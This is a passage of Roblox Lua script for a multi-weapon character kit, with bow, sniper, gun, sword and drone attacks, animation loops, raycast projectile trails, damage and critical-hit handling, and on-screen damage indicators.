so("http://www.roblox.com/asset/?id=10756118",sprt18,1,1)
Lightning(sprt17.Position,sprt18.Position,3,0.2,"Bright yellow",0.00001,0.4)
Lightning(sprt19.Position,sprt18.Position,3,0.2,"Bright yellow",0.00001,0.4)
arrowdebounce=true
wait(0.1)
arrowdebounce=false
end
end))
local top = sprt17.CFrame
local bottom = sprt19.CFrame
local oristrpos
if strmdl == "Bow" then
oristrpos = CFrame.new((top.p+bottom.p)/2)
elseif strmdl == "Arrow" then
oristrpos = sprt18.CFrame
end
local mg1 = (top.p - oristrpos.p).magnitude
local mg2 = (bottom.p - oristrpos.p).magnitude
stringmsh1.Scale=vt(0.1,mg1,0.1)
basecf=sprt17.CFrame
cff=CFrame.new(sprt17.CFrame*angles(1.57,0,0).p,sprt18.Position)*angles(math.rad(90),0,0)*cf(0,-mg1/2,0)
hit2=string1
hit=sprt18
stringwld1.Parent=string1
stringwld1.Part0=hit2
stringwld1.Part1=hit
HitPos=cff.p
local CJ = CFrame.new(HitPos)
local C0=cff:inverse() *CJ
local C1=hit.CFrame:inverse() * CJ
stringwld1.C0=C0
stringwld1.C1=C1
 
stringmsh2.Scale=vt(0.1,mg2,0.1)
cff2=CFrame.new(sprt18.CFrame*angles(1.57,0,0).p,sprt19.Position)*angles(math.rad(90),0,0)*cf(0,-mg2/2,0)
hit3=string2
hit2=sprt18
stringwld2.Parent=string2
stringwld2.Part0=hit3
stringwld2.Part1=hit2
HitPos2=cff2.p
local CJ2 = CFrame.new(HitPos2)
local C02=cff2:inverse() *CJ
local C12=hit2.CFrame:inverse() * CJ
stringwld2.C0=C02
stringwld2.C1=C12
until string1.Parent==nil
end))
swld18.Part1=RightArm
swld18.C0=cf(0,1,0)
local arrow=part(3,sword,0,1,BrickColor.new("Bright yellow"),"Arrow",vt(1,1,1))
local arrowmsh=mesh("SpecialMesh",arrow,"FileMesh","http://www.roblox.com/asset/?id=15887356",vt(0,0,0),vt(1,1,2))
arrowmsh.VertexColor=vt(1,1,1)
local arrowwld=weld(arrow,arrow,sprt18,euler(-1.57,0,0)*cf(0,1,0))
for i=0,1,0.1 do
wait()
arrow.Transparency=arrow.Transparency-0.05
arrowwld.C0=euler(-1.57,0,0)*cf(0,1,0)*euler(0,0,0.15*i)
RW.C0=cf(1.5-2.5+2*i, 0.5, -1) * euler(1.57,0,-1.77+0.2*i)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(-1.5, 0.5, 0) * euler(1.57,0,-1.27)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
while BowAim==true do
wait(0)
end
so("http://www.roblox.com/asset/?id=16211041",prt18,1,1)
spread=0
range=500
rangepower=100
shoottrail(MMouse.Hit.p,arrow,30,10,2)
Humanoid.WalkSpeed=0
arrow.Parent=nil
swld18.Part0=sprt18
swld18.Part1=sprt1
swld18.C0=cf(0,0,-0.8)
for i=0,1,0.2 do
wait()
Neck.C0=necko*euler(-0.2*i,0,HeadNumb)
RW.C0=cf(1, 0.5, -1) * euler(1.57,0,-1.57)
RW.C1=cf(0, 0.5, 0) * euler(-0.4*i,0,0)
LW.C0=cf(-1.5, 0.5, 0) * euler(1.57,0,-1.27)
LW.C1=cf(0, 0.5, 0) * euler(-0.4*i,0,0)
end
for i=0,1,0.1 do
wait()
Neck.C0=necko*euler(-0.2-0.1*i,0,HeadNumb)
RW.C0=cf(1, 0.5, -1) * euler(1.57,0,-1.57)
RW.C1=cf(0, 0.5, 0) * euler(-0.4-0.1*i,0,0)
LW.C0=cf(-1.5, 0.5, 0) * euler(1.57,0,-1.27)
LW.C1=cf(0, 0.5, 0) * euler(-0.4-0.1*i,0,0)
end
string1.Parent=nil
string2.Parent=nil
BowAim=false
Humanoid.WalkSpeed=16
Bg.Parent=nil
for i=0,1,0.1 do
wait()
Neck.C0=necko*euler(-0.3+0.3*i,0,HeadNumb-HeadNumb*i)
RW.C0=cf(1+0.5*i, 0.5, -1+1*i) * euler(1.57-1.57*i,0,-1.57+1.77*i)
RW.C1=cf(0, 0.5, 0) * euler(-0.5+0.5*i,0,0)
LW.C0=cf(-1.5, 0.5, 0) * euler(1.57-1.57*i,0,-1.27+1.07*i)
LW.C1=cf(0, 0.5, 0) * euler(-0.5+0.5*i,0,0)
end
spread=0
range=500
rangepower=50
Neck.C1=necko2
Neck.C0=necko
attack=false
end
 
function Aim()
attack=true
Humanoid.WalkSpeed=5
Bg.Parent=Torso
Bg.cframe=Head.CFrame
CF=Torso.CFrame
for i=0,1,0.1 do
wait()
Bg.cframe=CF*euler(0,0.785*i,0)
Neck.C0=necko*euler(0,0,-0.785*i)
Neck.C1=necko2*euler(0,-0.5*i,0)
RW.C0=cf(1+0.2*i, 0.3, -0.5-0.2*i) * euler(0.9+0.6*i,0,-0.3+0.1*i)
RW.C1=cf(0, 0.5, 0) * euler(0,1.3+0.27*i,0)
LW.C0=cf(-1.2, 0.5, -0.3) * euler(1.07+0.5*i,0,0.7+0.085*i)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
attack=false
end
 
function UnAim()
attack=true
Humanoid.WalkSpeed=16
for i=0,1,0.1 do
wait()
Bg.cframe=CF*euler(0,0.785-0.785*i,0)
Neck.C0=necko*euler(0,0,-0.785+0.785*i)
Neck.C1=necko2*euler(0,-0.5+0.5*i,0)
RW.C0=cf(1.2-0.2*i, 0.3, -0.7+0.2*i) * euler(1.5-0.6*i,0,-0.2-0.1*i)
RW.C1=cf(0, 0.5, 0) * euler(0,1.57-0.27*i,0)
LW.C0=cf(-1.2, 0.5, -0.3) * euler(1.57-0.5*i,0,0.785-0.085*i)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
Bg.Parent=nil
attack=false
end
 
function SniperShoot()
attack=true
spread=0
range=1000
rangepower=100
shoottrail(MMouse.Hit.p,snprt15,20,20,0.5)
coroutine.resume(coroutine.create(function()
for z = 1 ,4 do
coroutine.resume(coroutine.create(function()
local meshb1 = Instance.new("BlockMesh")
meshb1.Scale = Vector3.new(1,1,1)
light = Instance.new("PointLight")
light.Brightness = .8
light.Color = Color3.new(100,50,0)
light.Range = 10
local shellb1 = Instance.new("Part")
light.Parent = shellb1
meshb1.Parent = shellb1
shellb1.Anchored = true
shellb1.formFactor = 3
shellb1.Size = Vector3.new(0.3,0.3,0.3) * (math.random(100,300)/100)
shellb1.CFrame = CFrame.new((snprt15.CFrame * CFrame.new(0,-snprt15.Size.y/2,0)).p) * CFrame.Angles(math.random(-100,100)/100,math.random(-100,100)/100,math.random(-100,100)/100)
shellb1.Parent = Character
shellb1.Transparency = 0
if math.random(1,2) == 1 then
shellb1.BrickColor = BrickColor.new("Bright red")
else
shellb1.BrickColor = BrickColor.new("Bright orange")
end
shellb1.CanCollide = false
local incre = math.random(0,60)/100
HCF=Head.CFrame.lookVector
for i = 0 , 1 , 0.02 do
wait()
light.Brightness = light.Brightness - .02
shellb1.CFrame = shellb1.CFrame + HCF*incre
shellb1.Transparency = 1*i
meshb1.Scale = Vector3.new(1+1*i,1+1*i,1+1*i)
end
shellb1.Parent=nil
end))
end
end))
so("http://roblox.com/asset/?id=10209875",snprt15,1,0.8)
for i=0,1,0.3 do
wait()
Neck.C0=necko*euler(-0.3*i,0,-0.785)
RW.C0=cf(1.2, 0.3, -0.7) * euler(1.5+0.3*i,0,-0.2)
RW.C1=cf(0, 0.5, 0) * euler(0,1.57,0)
LW.C0=cf(-1.2, 0.5, -0.3) * euler(1.57,0,0.785)
LW.C1=cf(0, 0.5, 0) * euler(-0.3*i,0,0)
end
for i=0,1,0.2 do
wait()
Neck.C0=necko*euler(-0.3-0.1*i,0,-0.785)
RW.C0=cf(1.2, 0.3, -0.7) * euler(1.5+0.3+0.1*i,0,-0.2)
RW.C1=cf(0, 0.5, 0) * euler(0,1.57,0)
LW.C0=cf(-1.2, 0.5, -0.3) * euler(1.57,0,0.785)
LW.C1=cf(0, 0.5, 0) * euler(-0.3-0.1*i,0,0)
end
Humanoid.WalkSpeed=16
for i=0,1,0.1 do
wait()
Neck.C0=necko*euler(-0.4+0.6*i,0,-0.785+0.785*i)
Neck.C1=necko2*euler(0,-0.5+0.5*i,0)
RW.C0=cf(1.2, 0.3, -0.7) * euler(1.9-0.6*i,0,-0.2-0.4*i)
RW.C1=cf(0, 0.5, 0) * euler(0,1.57,0)
LW.C0=cf(-1.2, 0.5, -0.3) * euler(1.57,0,0.785-0.185*i)
LW.C1=cf(0, 0.5, 0) * euler(-0.4+0.8*i,0,0)
end
so("http://roblox.com/asset/?id=10209881",snprt15,1,1)
local ammo=part(3,workspace,0,0,BrickColor.new("Bright yellow"),"Ammo",vt(1,1,1))
ammo.CanCollide=true
ammomsh=mesh("CylinderMesh",ammo,"","",vt(0,0,0),vt(0.15,0.2,0.15))
local cfrf = snprt25.CFrame * CFrame.fromEulerAnglesXYZ(0,1.57,0)
local cfr = cfrf + cfrf.lookVector * -0.5
ammo.CFrame = cfr
ammo.RotVelocity = Vector3.new(math.random(-5,5),math.random(-5,5),math.random(-5,5))
ammo.Velocity = cfr.lookVector * 20
coroutine.resume(coroutine.create(function(Part)
wait(10)
Part.Parent=nil
end),ammo)
for i=0,1,0.2 do
wait()
snwld26.C1=euler(0,0,1*i)
RW.C0=cf(1.2, 0.3, -0.7-0.4*i) * euler(1.3,0,-0.6+0.3*i)
RW.C1=cf(0, 0.5, 0) * euler(0,1.57,0)
end
for i=0,1,0.2 do
wait()
snwld26.C1=euler(0,0,1-1*i)
RW.C0=cf(1.2, 0.3, -0.7-0.4+0.4*i) * euler(1.3,0,-0.6+0.3-0.3*i)
RW.C1=cf(0, 0.5, 0) * euler(0,1.57,0)
end
Humanoid.WalkSpeed=5
for i=0,1,0.1 do
wait()
Neck.C0=necko*euler(0.2-0.2*i,0,-0.785*i)
Neck.C1=necko2*euler(0,-0.5*i,0)
RW.C0=cf(1.2, 0.3, -0.7) * euler(1.3+0.2*i,0,-0.6+0.4*i)
RW.C1=cf(0, 0.5, 0) * euler(0,1.57,0)
LW.C0=cf(-1.2, 0.5, -0.3) * euler(1.57,0,0.6+0.185*i)
LW.C1=cf(0, 0.5, 0) * euler(0.4-0.4*i,0,0)
end
spread=0
range=500
rangepower=50
attack=false
end
 
function RemoveDrones()
attack=true
for i=0,1,0.1 do
wait()
Neck.C0=necko*euler(-0.5*i,0,0)
RW.C0=cf(1.5, 0.5, 0) * euler(0.5+2.64*i,0,0)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(-1.5, 0.5, 0) * euler(0,0,-0.2)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
for _,v in pairs(modelzorz:children()) do
if v.Name=="Drone" then
print("FoundDrone")
for _,s in pairs(v:children()) do
if s.className=="Part" then
s.Anchored=true
coroutine.resume(coroutine.create(function(Part,Model)
for i=0,1,0.1 do
wait(0)
Part.Transparency=Part.Transparency+0.1
end
wait()
Model.Parent=nil
end),s,v)
end
end
end
end
wait(1)
for i=0,1,0.1 do
wait()
Neck.C0=necko*euler(-0.5+0.5*i,0,0)
RW.C0=cf(1.5, 0.5, 0) * euler(3.14-3.14*i,0,0)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(-1.5, 0.5, 0) * euler(0,0,-0.2+0.2*i)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
attack=false
end
 
function RemoveDrones2()
attack=true
for i=0,1,0.1 do
wait()
Neck.C0=necko*euler(-0.3-0.3*i,0,-0.3+0.3*i)
RW.C0=cf(1, 0.3, -0.8) * euler(1.57-0.4*i,0,-0.7)
RW.C1=cf(0, 0.5, 0) * euler(0,-1.5,0)
LW.C0=cf(-1.2-0.3*i, 0.5, -0.3+0.3*i) * euler(2.3+0.84*i,0,0.7-0.7*i)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
for _,v in pairs(modelzorz:children()) do
if v.Name=="Drone" then
print("FoundDrone")
for _,s in pairs(v:children()) do
if s.className=="Part" then
s.Anchored=true
coroutine.resume(coroutine.create(function(Part,Model)
for i=0,1,0.1 do
wait(0)
Part.Transparency=Part.Transparency+0.1
end
wait()
Model.Parent=nil
end),s,v)
end
end
end
end
wait(1)
for i=0,1,0.1 do
wait()
Neck.C0=necko*euler(-0.6+0.3*i,0,-0.3*i)
RW.C0=cf(1, 0.3, -0.8) * euler(1.17+0.4*i,0,-0.7)
RW.C1=cf(0, 0.5, 0) * euler(0,-1.5,0)
LW.C0=cf(-1.5+0.3*i, 0.5, -0.3*i) * euler(3.14-0.84*i,0,0.7*i)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
attack=false
end
 
function RemoveGun()
attack=true
for i=0,1,0.1 do
wait()
RW.C0=cf(1.5-0.5*i, 0.5-0.2*i, -0.8*i) * euler(1.27*i,0,0.2-1.5*i)
RW.C1=cf(0, 0.5, 0) * euler(0,-1*i,0)
LW.C0=cf(-1.2-0.3*i, 0.5, -0.3+0.2*i) * euler(0.5+1.07*i,0,0.6-0.6*i)
LW.C1=cf(0, 0.5, 0) * euler(0,1.57,0)
end
for _,s in pairs(gun:children()) do
if s.className=="Part" then
coroutine.resume(coroutine.create(function(Part,Model)
for i=0,1,0.1 do
wait(0)
Part.Transparency=Part.Transparency+0.1
end
wait()
Model.Parent=nil
end),s,gun)
end
end
wait(0.7)
for i=0,1,0.1 do
wait()
RW.C0=cf(1+0.5*i, 0.3+0.2*i, -0.8+0.8*i) * euler(1.27-1.27*i,0,-1.3+1.3*i)
RW.C1=cf(0, 0.5, 0) * euler(0,-1+1*i,0)
LW.C0=cf(-1.5, 0.5, -0.1+0.1*i) * euler(1.57-1.57*i,0,0)
LW.C1=cf(0, 0.5, 0) * euler(0,1.57-1.57*i,0)
end
attack=false
end
function RemoveSword()
attack=true
for i=0,1,0.1 do
wait()
RW.C0=cf(1.5-0.5*i, 0.5-0.2*i, -0.8*i) * euler(1.27*i,0,0.2-1.5*i)
RW.C1=cf(0, 0.5, 0) * euler(0,-1*i,0)
LW.C0=cf(-1.5, 0.5, -0.1*i) * euler(1.57*i,0,-0.4+0.4*i)
LW.C1=cf(0, 0.5, 0) * euler(0,1.57*i,0)
end
for _,s in pairs(sword:children()) do
if s.className=="Part" then
coroutine.resume(coroutine.create(function(Part,Model)
for i=0,1,0.1 do
wait(0)
Part.Transparency=Part.Transparency+0.1
end
wait()
Model.Parent=nil
end),s,sword)
end
end
wait(0.7)
for i=0,1,0.1 do
wait()
RW.C0=cf(1+0.5*i, 0.3+0.2*i, -0.8+0.8*i) * euler(1.27-1.27*i,0,-1.3+1.3*i)
RW.C1=cf(0, 0.5, 0) * euler(0,-1+1*i,0)
LW.C0=cf(-1.5, 0.5, -0.1+0.1*i) * euler(1.57-1.57*i,0,0)
LW.C1=cf(0, 0.5, 0) * euler(0,1.57-1.57*i,0)
end
attack=false
end
function RemoveSniper()
attack=true
for i=0,1,0.1 do
wait()
Neck.C0=necko*euler(0.4*i,0,0)
snwld1.C0=euler(2.07+0.3*i,0,0)*cf(0,1,0)
RW.C0=cf(1, 0.3, -0.5-0.3*i) * euler(0.9+0.37*i,0,-0.3-1*i)
RW.C1=cf(0, 0.5, 0) * euler(0,1.3-1*i,0)
LW.C0=cf(-1.2, 0.5, -0.3) * euler(1.07,0,0.7-0.2*i)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
for _,s in pairs(sniper:children()) do
if s.className=="Part" then
coroutine.resume(coroutine.create(function(Part,Model)
for i=0,1,0.1 do
wait(0)
Part.Transparency=Part.Transparency+0.1
end
wait()
Model.Parent=nil
end),s,sniper)
end
end
wait(0.7)
for i=0,1,0.1 do
wait()
Neck.C0=necko*euler(0.4-0.4*i,0,0)
RW.C0=cf(1+0.5*i, 0.3, -0.8+0.8*i) * euler(1.27-1.27*i,0,-1.3+1.3*i)
RW.C1=cf(0, 0.5, 0) * euler(0,0.3-0.3*i,0)
LW.C0=cf(-1.2-0.3*i, 0.5, -0.3+0.3*i) * euler(1.07-1.07*i,0,0.5-0.5*i)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
attack=false
end
function rayCast(Pos, Dir, Max, Ignore)
return game:service("Workspace"):FindPartOnRay(Ray.new(Pos, Dir.unit * (Max or 999.999)), Ignore)
end
function Lightning(p0,p1,tym,ofs,col,th,tra)
local magz = (p0 - p1).magnitude local curpos = p0 local trz = {-ofs,ofs}
for i=1,tym do
local li = Instance.new("Part",workspace) li.TopSurface =0 li.BottomSurface = 0 li.Anchored = true  li.Transparency = tra or 0.4 li.BrickColor = BrickColor.new(col)
li.formFactor = "Custom" li.CanCollide = false li.Size = Vector3.new(th,th,magz/tym) local ofz = Vector3.new(trz[math.random(1,2)],trz[math.random(1,2)],trz[math.random(1,2)])
light1=Instance.new("PointLight")
light1.Brightness=.8
light1.Color=Color3.new(.2,255,.2)
light1.Range=8
light1.Parent=li
local trolpos = CFrame.new(curpos,p1)*CFrame.new(0,0,magz/tym).p+ofz
if tym == i then
local magz2 = (curpos - p1).magnitude li.Size = Vector3.new(th,th,magz2)
li.CFrame = CFrame.new(curpos,p1)*CFrame.new(0,0,-magz2/2)
else
li.CFrame = CFrame.new(curpos,trolpos)*CFrame.new(0,0,magz/tym/2)
end
curpos = li.CFrame*CFrame.new(0,0,magz/tym/2).p game.Debris:AddItem(li,.2)
end
end
spread=0
range=500
rangepower=50
function shoottrail(ShootPosition,baseprt,Damage,Knockback,Size)
coroutine.resume(coroutine.create(function()
local spreadvector = (Vector3.new(math.random(-spread,spread),math.random(-spread,spread),math.random(-spread,spread))) * (baseprt.Position-ShootPosition).magnitude/100
local dir = CFrame.new((baseprt.Position+ShootPosition)/2,ShootPosition+spreadvector)
local hit,pos = rayCast(baseprt.Position,dir.lookVector,10,modelzorz)
local rangepos = range
local function drawtrail(From,To)
local effectsmsh = Instance.new("CylinderMesh")
effectsmsh.Scale = Vector3.new(1,1,1)
effectsmsh.Name = "Mesh"
local effectsg = Instance.new("Part")
effectsg.formFactor = 3
effectsg.CanCollide = false
effectsg.Name = "Eff"
effectsg.Locked = true
effectsg.Anchored = true
effectsg.Size = Vector3.new(0.2,0.2,0.2)
effectsg.Parent = modelzorz
effectsmsh.Parent = effectsg
effectsg.BrickColor = BrickColor.new("Bright yellow")
effectsg.Reflectance = 0.4
local LP = From
local point1 = To
local mg = (LP - point1).magnitude
effectsmsh.Scale = Vector3.new(2,mg*5,2)
effectsg.CFrame = CFrame.new((LP+point1)/2,point1) * CFrame.Angles(math.rad(90),0,0)
coroutine.resume(coroutine.create(function()
for i = 0 , 1 , 0.1 do
wait()
effectsg.Transparency = 1*i
effectsmsh.Scale = Vector3.new(Size-Size*i,mg*5,Size-Size*i)
end
effectsg.Parent = nil
end))
end
local newpos = baseprt.Position
local inc = rangepower
repeat
wait() wait()
rangepos = rangepos - 10
dir = dir
if Mode~="Sniper" then
dir = dir * CFrame.Angles(math.rad(-1),0,0)
end
hit,pos = rayCast(newpos,dir.lookVector,inc,Character)
drawtrail(newpos,pos)
newpos = newpos + (dir.lookVector * inc)
if inc >= 20 then
inc = inc - 10
end
if hit ~= nil then
rangepos = 0
end
until rangepos <= 0
if hit ~= nil then
if hit.Parent:FindFirstChild("Humanoid") ~= nil then
critical=false
if SnipAim==true then
if hit.Name=="Head" then
coroutine.resume(coroutine.create(function(HeadPart)
for i=0,0.5,0.1 do
wait()
HeadPart.Velocity=vt(0,60,0)
end
end),hit)
print("CRITICAL")
critical=true
p=it("Part")
p.Parent=workspace
p.CanCollide=false
p.Transparency=1
p.CFrame=hit.CFrame
p.Anchored=true
local GUI = it("BillboardGui")
GUI.Adornee = p
GUI.Parent = p
GUI.Active = true
GUI.Enabled = true
GUI.Size = UDim2.new(1, 0, 1, 0)
GUI.StudsOffset = vt(0, 4, 0)
local Chat = it("TextLabel")
Chat.Parent = GUI
Chat.FontSize = "Size12"
Chat.Position = UDim2.new(0.599999964, 0, 0, 0)
Chat.Visible = true
Chat.Text = "Critical!"
coroutine.resume(coroutine.create(function(Part)
for i=0,4,0.1 do
wait()
Part.CFrame=Part.CFrame*cf(0,0.05,0)
end
Part.Parent=nil
end),p)
for i=0,7 do
        Blood=it("Part")
        Blood.Name="Blood"
        Blood.TopSurface="Smooth"
        Blood.BottomSurface="Smooth"
        Blood.formFactor="Plate"
        Blood.BrickColor=BrickColor:Red()
        Blood.Size=vt(1,.4,1)
        Blood.Velocity=vt(math.random(-4,4),math.random(5,25),math.random(-4,4))
        Blood.CFrame=hit.CFrame*euler(math.random(-50,50),math.random(-50,50),math.random(-50,50))
        Blood.Parent=workspace
        Blood.Velocity=vt(math.random(-20,20),math.random(20,50),math.random(-20,20))
        Blood.CanCollide=false
        coroutine.resume(coroutine.create(function(blod)
        wait(0.1)
        blod.CanCollide=true
        wait(5)
        blod.Parent = nil
        end),Blood)
end
end
hum = hit.Parent.Humanoid
tTorso=hit.Parent.Torso
end
if critical==true then
CRIT=true
Damagefunc1(hit,Damage*math.random(3,8),Knockback)
else
Damagefunc1(hit,Damage,Knockback)
end
attackdebounce=false
elseif hit.Parent.Parent ~= nil and hit.Parent.Parent:FindFirstChild("Humanoid") ~= nil then
if SnipAim==true then
if hit.Parent.className == "Hat" then
hatCF=hit.CFrame
coroutine.resume(coroutine.create(function(hat)
hat.Handle:BreakJoints()
hat.Handle.CFrame=hatCF
hat.Handle.CanCollide=true
hat.Handle.Velocity=vt(math.random(-10,10),40,math.random(-10,10))
wait(3)
hatCF=hat.Handle.CFrame
hat.Parent=workspace
for i=0,4,0.2 do
wait()
hat.Handle.CFrame=hatCF
hat.Handle.Velocity=vt(math.random(-5,5),20,math.random(-5,5))
end
end),hit.Parent)
end
end
hum = hit.Parent.Parent.Humanoid
tTorso=hit.Parent.Parent.Torso
Damagefunc1(hit.Parent.Parent.Torso,Damage,Knockback)
attackdebounce=false
end
end
end))
end
function findNearestTorso(pos)
    local list = game:service("Workspace"):children()
    local torso = nil
    local dist = 50
    local temp = nil
    local human = nil
    local temp2 = nil
    for x = 1, #list do
        temp2 = list[x]
        if (temp2.className == "Model") and (temp2 ~= Character) and (temp2.Name ~= "Fenrier") then
            temp = temp2:findFirstChild("Torso")
            human = temp2:findFirstChild("Humanoid")
            if (temp ~= nil) and (human ~= nil) and (human.Health > 0) then
                if (temp.Position - pos).magnitude < dist then
                    torso = temp
                    dist = (temp.Position - pos).magnitude
                end
            end
        end
    end
    return torso
end
function MagicCircle(brickcolor,cframe,x1,y1,z1,x2,y2,z2,x3,y3,z3)
local prt=part(3,workspace,0,0,brickcolor,"Effect",vt(0.5,0.5,0.5))
prt.Anchored=true
prt.CFrame=cframe*cf(x2,y2,z2)
local msh=mesh("SpecialMesh",prt,"Sphere","",vt(0,0,0),vt(x1,y1,z1))
coroutine.resume(coroutine.create(function()
for i=0,1,0.1 do
wait()
prt.CFrame=prt.CFrame
prt.Transparency=i
msh.Scale=msh.Scale+vt(x3,y3,z3)
end
prt.Parent=nil
end))
end
Damagefunc1=function(hit,Damage,Knockback)
    if hit.Parent==nil then
        return
    end
    CPlayer=Bin
    h=hit.Parent:FindFirstChild("Humanoid")
    if h~=nil and hit.Parent.Name~=Character.Name and hit.Parent:FindFirstChild("Torso")~=nil then
    if attackdebounce == false then
    attackdebounce = true
    coroutine.resume(coroutine.create(function()
    wait(0.2)
    attackdebounce = false
    end))
    Damage=Damage
            c=Instance.new("ObjectValue")
            c.Name="creator"
            c.Value=game:service("Players").LocalPlayer
            c.Parent=h
            game:GetService("Debris"):AddItem(c,.5)
        Damage=Damage+math.random(0,10)
        blocked=false
        block=hit.Parent:findFirstChild("Block")
        if block~=nil then
        print("herp")
        if block.Value>0 then
        blocked=true
        block.Value=block.Value-1
        print(block.Value)
        end
        end
        if blocked==false then
        h.Health=h.Health-Damage
        showDamage(hit.Parent,Damage,.5)
        else
        h:TakeDamage(1)
        showDamage(hit.Parent,1,.5)
        end
        vp=Instance.new("BodyVelocity")
        vp.P=500
        vp.maxForce=Vector3.new(math.huge,0,math.huge)
        vp.velocity=Head.CFrame.lookVector*Knockback+Head.Velocity/1.05
        if Knockback>0 then
            vp.Parent=hit.Parent.Torso
        end
        game:GetService("Debris"):AddItem(vp,.25)
                c=Instance.new("ObjectValue")
            c.Name="creator"
            c.Value=Player
            c.Parent=h
            game:GetService("Debris"):AddItem(c,.5)
        CRIT=false
        hitDeb=true
        AttackPos=6
    end
    end
end
showDamage=function(Char,Dealt,du)
    m=Instance.new("Model")
    m.Name=tostring(Dealt)
    h=Instance.new("Humanoid")
    h.Health=0
    h.MaxHealth=0
    h.Parent=m
    c=Instance.new("Part")
    c.Transparency=0
    c.BrickColor=BrickColor:Red()
    if CRIT==true then
        c.BrickColor=BrickColor.new("Really red")
    end
    c.Name="Head"
    c.TopSurface=0
    c.BottomSurface=0
    c.formFactor="Plate"
    c.Size=Vector3.new(1,.4,1)
    ms=Instance.new("CylinderMesh")
    ms.Scale=Vector3.new(.8,.8,.8)
    if CRIT==true then
        ms.Scale=Vector3.new(1,1.25,1)
    end
    ms.Parent=c
    c.Reflectance=0
    Instance.new("BodyGyro").Parent=c
    c.Parent=m
    c.CFrame=CFrame.new(Char["Head"].CFrame.p+Vector3.new(0,1.5,0))
    f=Instance.new("BodyPosition")
    f.P=2000
    f.D=100
    f.maxForce=Vector3.new(math.huge,math.huge,math.huge)
    f.position=c.Position+Vector3.new(0,3,0)
    f.Parent=c
    game:GetService("Debris"):AddItem(m,.5+du)
    c.CanCollide=false
    m.Parent=workspace
    c.CanCollide=false
end
function ob1d(mouse)
if attack == true then return end
hold=true
if Mode=="Drones" and Aiming==true then
print("Attack drones")
for i=0,1,0.1 do
wait()
RW.C0=cf(1.5, 0.5, 0) * euler(0.5+1.07*i,0,0)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(-1.5, 0.5, 0) * euler(0,0,-0.2)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
Drone1debounce=false
Drone2debounce=false
Drone3debounce=false
for _,v in pairs(modelzorz:children()) do
if v.Name=="Drone" then
coroutine.resume(coroutine.create(function(Drone)
while hold==true do
so("http://roblox.com/asset/?id=10209257",Drone.DPart1,0.5,1.5)
shoottrail(MMouse.Hit.p,Drone.DPart1,5,0,1)
wait(math.random(0,2)+math.random())
end
end),v)
end
end
while hold==true do
wait()
end
for i=0,1,0.1 do
wait()
RW.C0=cf(1.5, 0.5, 0) * euler(1.57-1.07*i,0,0)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(-1.5, 0.5, 0) * euler(0,0,-0.2)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
elseif Aiming==false then
for _,v in pairs(modelzorz:children()) do
if v.Name=="Drone" and v:findFirstChild("CanShoot")~=nil then
coroutine.resume(coroutine.create(function(Drone)
while hold==true do
if v.CanShoot.Value==true then
print("Shoot")
so("http://roblox.com/asset/?id=10209257",Drone.DPart1,0.5,1.5)
shoottrail(Drone.DPart6.Position,Drone.DPart1,5,0,1)
elseif v.CanShoot.Value==false then
print("NoShoot")
end
wait(math.random(0,2)+math.random())
end
end),v)
end
end
end
if Mode=="Gun" then
print("Shoot")
Shoot()
end
if Mode=="Sword" then
slash1()
if hold==true then
slash2()
end
if hold==true then
slash3()
end
wait(0.5)
Bg.Parent=nil
Neck.C0=necko*euler(0,0,0)
swld1.C0=euler(0,-1.57,-1.57)*cf(0,1,0)
swld1.C1=euler(0,1.57,0)
RW.C0=cf(1.5, 0.5, 0) * euler(0,0,0.2)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(-1.5, 0.5, 0) * euler(0,0,-0.4)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
if Mode=="Sniper" and SnipAim==true then
SniperShoot()
end
end
function ob1u(mouse)
hold = false
end
buttonhold = false
eul=0
function key(key)
if attack == true then return end
if Mode=="Drones" then
if key=="z" then
RemoveDrones()
Mode="Choose"
equipanim()
return
end
if key=="f" then
if Aiming==false then
attack=true
for i=0,1,0.1 do
wait()
RW.C0=cf(1.5, 0.5, 0) * euler(0.5+2.64*i,0,0)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(-1.5, 0.5, 0) * euler(0,0,-0.2)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
for i=0,1,0.1 do
wait()
RW.C0=cf(1.5, 0.5, 0) * euler(3.14-1.57*i,0,0)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(-1.5, 0.5, 0) * euler(0,0,-0.2)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
Aiming=true
coroutine.resume(coroutine.create(function()
while Aiming==true do
wait()
DroneTarget=MMouse.Hit.p
end
end))
wait(0.5)
for i=0,1,0.1 do
wait()
RW.C0=cf(1.5, 0.5, 0) * euler(1.57-1.07*i,0,0)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(-1.5, 0.5, 0) * euler(0,0,-0.2)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
attack=false
elseif Aiming==true then
attack=true
for i=0,1,0.1 do
wait()
RW.C0=cf(1.5-0.5*i, 0.5, -0.5*i) * euler(.5+1.07*i,0,-1*i)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(-1.5+0.5*i, 0.5, -0.5*i) * euler(1.57*i,0,-0.2+1.2*i)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
Aiming=false
for _,v in pairs(modelzorz:children()) do
if v.Name=="Drone" then
Valuee=Instance.new("BoolValue")
Valuee.Parent=v
Valuee.Name="CanShoot"
print("Found Drone")
